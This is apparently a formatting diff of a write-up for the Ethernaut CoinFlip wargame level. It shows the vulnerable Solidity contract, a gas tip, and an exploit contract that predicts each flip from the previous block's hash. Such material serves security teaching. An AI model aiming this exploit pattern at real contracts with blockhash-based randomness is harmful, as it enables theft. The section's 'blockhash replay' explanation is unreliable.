@@ -1,4 +1,5 @@
 ### TASK
+
 The task is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.
 
 ```solidity
@@ -6,10 +7,10 @@ The task is a coin flipping game where you need to build up your winning streak 
 pragma solidity ^0.8.0;
 
 contract CoinFlip {
-
   uint256 public consecutiveWins;
   uint256 lastHash;
-  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+  uint256 FACTOR =
+    57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
   constructor() {
     consecutiveWins = 0;
@@ -38,13 +39,15 @@ contract CoinFlip {
 ```
 
 ### Gas Golfering
-The FACTOR state variable could be declared as constant to save gas. 
+
+The FACTOR state variable could be declared as constant to save gas.
 
 ```solidity
 uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 ```
 
 ### Code Vunerability
+
 The CoinFlip contract is vulnerable to: <br/>
 
 Blockhash Replay Attack: An attacker can replay the same blockhash value by mining two/more blocks with the same blockhash value, which would allow them to always win the coin flip.
@@ -63,24 +66,24 @@ There is no real native randomness in the blockchain and all randomness is pseud
 #### Hack the contract
 
 ```solidity
-contract HackCoinFlip{
-    CoinFlip immutable coinflipContract;
-    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+contract HackCoinFlip {
+  CoinFlip immutable coinflipContract;
+  uint256 constant FACTOR =
+    57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
-    constructor ( CoinFlip _coinflipContract){
-        coinflipContract = CoinFlip(_coinflipContract);
-    }
+  constructor(CoinFlip _coinflipContract) {
+    coinflipContract = CoinFlip(_coinflipContract);
+  }
 
-    //call this function 10 times
-    function guessValue() external {
-          uint256 blockValue = uint256(blockhash(block.number - 1));
-          uint256 coinFlip = uint256(blockValue / FACTOR);
-          bool side = coinFlip == 1 ? true : false;
-          
-          coinflipContract.flip(side);
-    }
+  //call this function 10 times
+  function guessValue() external {
+    uint256 blockValue = uint256(blockhash(block.number - 1));
+    uint256 coinFlip = uint256(blockValue / FACTOR);
+    bool side = coinFlip == 1 ? true : false;
+
+    coinflipContract.flip(side);
+  }
 }
-
 ```
 
-Link to Exploit contract: https://github.com/Sayrarh/Ethernaut-Challenge-with-Foundry/blob/master/test/CoinFlip.t.sol
+Link to Exploit contract: [here](https://github.com/Sayrarh/Ethernaut-Challenge-with-Foundry/blob/master/test/CoinFlip.t.sol)
